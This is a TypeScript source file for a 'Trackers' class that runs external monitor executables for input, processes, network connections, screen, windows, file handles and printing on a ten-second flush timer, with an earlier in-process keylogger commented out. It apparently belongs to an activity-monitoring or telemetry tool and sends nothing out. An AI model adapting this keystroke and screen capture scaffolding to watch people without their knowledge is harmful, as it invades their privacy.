// import Keylogger from './Keylogger'
// import ProcessTracker from './ProcessTracker'
// import ConnectionTracker from './ConnectionTracker'
// import PointerTracker from './PointerTracker'
// import FileTracker from './FileTracker'
import ExternalTracker from './ExternalTracker'

const SECOND = 1000

class Trackers {
  // private keylogger: Keylogger = new Keylogger()
  // private processTracker: ProcessTracker = new ProcessTracker()
  // private connectionTracker: ConnectionTracker = new ConnectionTracker()
  // private pointerTracker: PointerTracker = new PointerTracker()
  // private fileTracker: FileTracker = new FileTracker()
  private inputTracker: ExternalTracker = new ExternalTracker('input_monitor.exe')
  private processTracker: ExternalTracker = new ExternalTracker('process_monitor.exe')
  private connectionTracker: ExternalTracker = new ExternalTracker('net_monitor.exe')
  private screenTracker: ExternalTracker = new ExternalTracker('screen_monitor.exe')
  private windowTracker: ExternalTracker = new ExternalTracker('window_monitor.exe')
  private fileTracker: ExternalTracker = new ExternalTracker('file_handle_monitor.exe')
  private printTracker: ExternalTracker = new ExternalTracker('print_monitor.exe')
  constructor() {
    this.scheduleFlushes()
  }
  async flushAll(): Promise<void> {
    // console.log(this.keylogger.flush())
    // console.log(await this.processTracker.flush())
    // console.log(this.connectionTracker.flush())
    // console.log(this.pointerTracker.flush())
    // console.log(await this.fileTracker.flush())
  }

  async killAll(): Promise<void> {
    this.inputTracker.kill()
    this.processTracker.kill()
    this.connectionTracker.kill()
    this.screenTracker.kill()
    this.windowTracker.kill()
    this.fileTracker.kill()
    this.printTracker.kill()
  }

  scheduleFlushes(): void {
    setInterval(() => {
      this.flushAll()
    }, 10 * SECOND)
  }
}

export default Trackers
